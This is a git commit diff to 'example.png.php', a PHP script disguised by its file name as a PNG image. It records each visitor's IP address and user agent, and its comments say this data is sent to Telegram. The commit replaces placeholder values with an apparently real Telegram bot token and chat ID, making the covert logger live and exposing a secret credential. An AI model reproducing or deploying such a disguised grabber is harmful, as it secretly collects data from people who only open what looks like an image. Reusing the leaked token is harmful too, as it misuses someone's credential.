e8bae4112eb3e57707de47a1c582318e9dc09c24
forhostingpon12121 <legendachota@gmail.com>
2024-07-07 20:54:18 +0300

    Update example.png.php

--- example.png.php
+++ example.png.php
@@ -4,8 +4,8 @@
     $userAgent = $_SERVER['HTTP_USER_AGENT'];
 
     // Информация для отправки в Telegram
-    $token = 'YOUR_TELEGRAM_BOT_TOKEN';
-    $chatId = 'YOUR_CHAT_ID';
+    $token = '7419899814:AAH1plPVW3g5ZUGAFBXKZLmWYGEA0kU20FI';
+    $chatId = '-1002151934748';
     $message = "IP address: $ip\nUser Agent: $userAgent";
 
     // Отправка данных в Telegram
